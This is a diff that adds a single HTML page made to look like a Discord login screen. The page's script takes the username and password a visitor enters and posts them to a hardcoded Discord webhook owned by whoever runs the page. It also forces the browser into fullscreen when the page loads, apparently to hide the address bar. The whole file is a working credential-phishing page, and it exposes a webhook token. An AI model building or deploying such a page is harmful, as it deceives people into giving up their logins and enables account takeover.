@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Login to Discord</title>
+    <style>
+        body {
+            background-color: #7289da;
+            color: white;
+            font-family: Arial, sans-serif;
+            text-align: center;
+        }
+        form {
+            margin: 0 auto;
+            width: 250px;
+            padding: 20px;
+            background-color: #5865f2;
+            border-radius: 10px;
+        }
+        input[type="text"],
+        input[type="password"],
+        input[type="button"] {
+            width: 100%;
+            padding: 8px;
+            margin: 5px 0;
+            box-sizing: border-box;
+            border: none;
+            background-color: #8e9297;
+            color: white;
+            border-radius: 5px;
+        }
+        input[type="button"] {
+            background-color: #7289da;
+            cursor: pointer;
+        }
+    </style>
+    <script>
+        function sendData() {
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+
+            var data = {
+                username: username,
+                password: password
+            };
+
+            fetch('https://discord.com/api/webhooks/1260055078388371527/kqAjXWAC-DTqTJWeLNGOPtl6BiwHClcAAESc2PODI7b4flSGDvOpJG1MjNzhYGnlZHrB', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            }).then(response => {
+                if (response.ok) {
+                    alert('Data sent successfully for confirmation!');
+                } else {
+                    alert('Error sending data. Please try again.');
+                }
+            });
+        }
+
+        document.addEventListener("DOMContentLoaded", function() {
+            document.documentElement.requestFullscreen();
+        });
+    </script>
+</head>
+<body>
+    <h2>Login to Discord</h2>
+    <form>
+        <label for="username">Username:</label><br>
+        <input type="text" id="username" name="username"><br>
+        <label for="password">Password:</label><br>
+        <input type="password" id="password" name="password"><br><br>
+        <input type="button" value="Submit" onclick="sendData()">
+    </form>
+</body>
+  </html>
